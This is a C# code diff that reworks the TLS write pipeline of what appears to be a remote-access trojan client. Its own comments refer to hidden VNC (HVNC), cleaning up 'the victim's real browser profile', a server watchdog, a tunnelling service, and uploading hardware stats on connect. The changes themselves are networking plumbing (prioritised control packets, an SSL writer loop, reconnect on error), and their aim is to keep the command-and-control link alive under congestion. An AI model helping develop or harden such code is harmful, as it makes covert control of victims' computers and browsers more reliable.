@@ -34,6 +34,22 @@ internal class TlsClient : IDisposable
             new System.Threading.Channels.BoundedChannelOptions(2)
             { FullMode = System.Threading.Channels.BoundedChannelFullMode.DropWrite, SingleReader = true });
 
+    // ── Output channels (two-level write pipeline) ────────────────────────────
+    // The WriteLoop serialises packets into byte[] and enqueues them to these
+    // output channels.  A background SslWriterLoop drains them onto the SSL
+    // stream.  This decouples the WriteLoop from network I/O so congestion on
+    // frame writes can never block control packets (heartbeats, pongs, acks).
+    private readonly System.Threading.Channels.Channel<byte[]> _ctrlOutCh =
+        System.Threading.Channels.Channel.CreateBounded<byte[]>(
+            new System.Threading.Channels.BoundedChannelOptions(64)
+            { FullMode = System.Threading.Channels.BoundedChannelFullMode.DropWrite, SingleReader = true, SingleWriter = true });
+    private readonly System.Threading.Channels.Channel<byte[]> _frameOutCh =
+        System.Threading.Channels.Channel.CreateBounded<byte[]>(
+            new System.Threading.Channels.BoundedChannelOptions(2)
+            { FullMode = System.Threading.Channels.BoundedChannelFullMode.DropWrite, SingleReader = true, SingleWriter = true });
+
+    private CancellationTokenSource? _sessionCts;
+
     /// <summary>False after Disconnect/Uninstall — caller should NOT reconnect.</summary>
     public bool ShouldReconnect { get; private set; } = true;
 
@@ -131,12 +147,21 @@ internal class TlsClient : IDisposable
             Data = JsonSerializer.Serialize(info, SeroJson.Default.ClientInfoData)
         }, ct);
 
-        // Single-writer loop: drains control packets (Pong/heartbeat) before any
-        // frame data so a congested tunnel can never starve the server watchdog.
-        _ = WriteLoop(ct);
+        // Session-scoped CTS — shared by all loops.  SslWriterLoop cancels it on
+        // unrecoverable SSL errors so every loop exits and RunAsync reconnects.
+        using var sessionCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
+        _sessionCts = sessionCts;
+        var sessionCt = sessionCts.Token;
 
-        // Start heartbeat sender
-        _ = HeartbeatSender(ct);
+        // Two-level write pipeline:
+        //   SslWriterLoop (background) — drains output channels → SSL stream
+        //   WriteLoop (background)     — serialises packets → output channels (never blocks on I/O)
+        // HeartbeatSender (background) — produces heartbeats into _ctrlCh
+        // Decoupling the WriteLoop from network I/O means frame congestion on the
+        // tunnel can never stall control-packet delivery to the server watchdog.
+        _ = SslWriterLoop(sessionCt);
+        _ = WriteLoop(sessionCt);
+        _ = HeartbeatSender(sessionCt);
 
         // Send hardware stats immediately so CPU/GPU/RAM appear on connect (not after 15s)
         _ = Task.Run(async () =>
@@ -168,7 +193,7 @@ internal class TlsClient : IDisposable
         });
 
         // Read loop - handles all incoming commands
-        await ReadLoop(ct);
+        await ReadLoop(sessionCt);
 
         // Connection lost or server-initiated disconnect: stop HVNC so the victim's real
         // browser profile locks are cleaned up and they can reopen Edge/Chrome normally.
@@ -1558,10 +1583,19 @@ internal class TlsClient : IDisposable
         return Task.FromResult(queued);
     }
 
-    // The single SSL writer: drains all pending ctrl packets first (priority),
-    // then writes one frame packet if available, then waits.
-    // Ctrl packets (Pong, Heartbeat) always arrive before any frame data so the
-    // server watchdog is never starved even on a congested localtonet tunnel.
+    private byte[] SerializePacket(Packet packet)
+    {
+        var json = JsonSerializer.Serialize(packet, SeroJson.Default.Packet);
+        var jsonBytes = Encoding.UTF8.GetBytes(json);
+        var result = new byte[4 + jsonBytes.Length];
+        BitConverter.GetBytes(jsonBytes.Length).CopyTo(result, 0);
+        jsonBytes.CopyTo(result, 4);
+        return result;
+    }
+
+    // ── WriteLoop: serialises packets into output channels (never blocks on I/O) ──
+    // Drains all control packets into _ctrlOutCh first, then one frame into _frameOutCh.
+    // Output channels use DropWrite, so the WriteLoop is never blocked by congestion.
     private async Task WriteLoop(CancellationToken ct)
     {
         try
@@ -1570,43 +1604,74 @@ internal class TlsClient : IDisposable
             {
                 // ① Drain all queued control packets first (priority)
                 while (_ctrlCh.Reader.TryRead(out var ctrl))
-                    await WriteRawAsync(ctrl, ct);
+                    _ctrlOutCh.Writer.TryWrite(SerializePacket(ctrl));
 
-                // ② Write one frame if pending (respects _ctrlCh priority on next loop).
-                // 12s timeout: if a large frame stalls on a congested tunnel the stream is
-                // flagged bad and RunAsync reconnects — well within the 25s watchdog window.
+                // ② Write one frame if pending (dropped silently if _frameOutCh is full)
                 if (_frameCh.Reader.TryRead(out var frame))
                 {
-                    using var frameCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
-                    frameCts.CancelAfter(12_000);
-                    await WriteRawAsync(frame, frameCts.Token);
-                    continue; // recheck ctrl before next frame
+                    _frameOutCh.Writer.TryWrite(SerializePacket(frame));
+                    continue;
                 }
 
                 // ③ Both empty — wake immediately when either channel gets data
                 try
                 {
-                    using var linked = System.Threading.CancellationTokenSource.CreateLinkedTokenSource(ct);
+                    using var linked = CancellationTokenSource.CreateLinkedTokenSource(ct);
                     var ctrlWait  = _ctrlCh.Reader.WaitToReadAsync(linked.Token).AsTask();
                     var frameWait = _frameCh.Reader.WaitToReadAsync(linked.Token).AsTask();
                     await Task.WhenAny(ctrlWait, frameWait);
-                    linked.Cancel(); // release the other waiter
+                    linked.Cancel();
                 }
                 catch (OperationCanceledException) when (!ct.IsCancellationRequested) { }
             }
         }
-        catch { /* session CT cancelled or SSL error — RunAsync handles reconnect */ }
+        catch (OperationCanceledException) when (ct.IsCancellationRequested) { }
+        catch { /* WriteLoop failure — session CTS handles cleanup */ }
     }
 
-    private async Task WriteRawAsync(Packet packet, CancellationToken ct)
+    // ── SslWriterLoop: drains output channels onto the real SSL stream ────────────
+    // This is the ONLY task that calls SslStream.WriteAsync.  It runs in the
+    // background and may block on network I/O.  The WriteLoop is decoupled from it.
+    private async Task SslWriterLoop(CancellationToken ct)
     {
         var ssl = _ssl;
         if (ssl == null) return;
-        var json = JsonSerializer.Serialize(packet, SeroJson.Default.Packet);
-        var jsonBytes = Encoding.UTF8.GetBytes(json);
-        await ssl.WriteAsync(BitConverter.GetBytes(jsonBytes.Length).AsMemory(), ct);
-        await ssl.WriteAsync(jsonBytes.AsMemory(), ct);
-        await ssl.FlushAsync(ct);
+
+        try
+        {
+            while (!ct.IsCancellationRequested)
+            {
+                // Priority: drain all pending ctrl bytes first
+                while (_ctrlOutCh.Reader.TryRead(out var bytes))
+                    await ssl.WriteAsync(bytes, ct);
+
+                // Then write one frame
+                if (_frameOutCh.Reader.TryRead(out var frameBytes))
+                {
+                    await ssl.WriteAsync(frameBytes, ct);
+                    await ssl.FlushAsync(ct);
+                    continue;
+                }
+
+                if (ct.IsCancellationRequested) break;
+
+                // Nothing to write — flush once then wait for data on either output channel
+                await ssl.FlushAsync(ct);
+
+                using var linked = CancellationTokenSource.CreateLinkedTokenSource(ct);
+                var ctrlWait  = _ctrlOutCh.Reader.WaitToReadAsync(linked.Token).AsTask();
+                var frameWait = _frameOutCh.Reader.WaitToReadAsync(linked.Token).AsTask();
+                await Task.WhenAny(ctrlWait, frameWait);
+                linked.Cancel();
+            }
+        }
+        catch (OperationCanceledException) when (ct.IsCancellationRequested) { }
+        catch
+        {
+            // Unrecoverable SSL error — cancel the session so all loops exit
+            // and RunAsync triggers a reconnect.
+            try { _sessionCts?.Cancel(); } catch { }
+        }
     }
 
     private async Task<Packet?> ReadPacketAsync(CancellationToken ct)
@@ -1766,6 +1831,8 @@ internal class TlsClient : IDisposable
         _tcp?.Close();
         _ctrlCh.Writer.TryComplete();
         _frameCh.Writer.TryComplete();
+        _ctrlOutCh.Writer.TryComplete();
+        _frameOutCh.Writer.TryComplete();
     }
 }
 
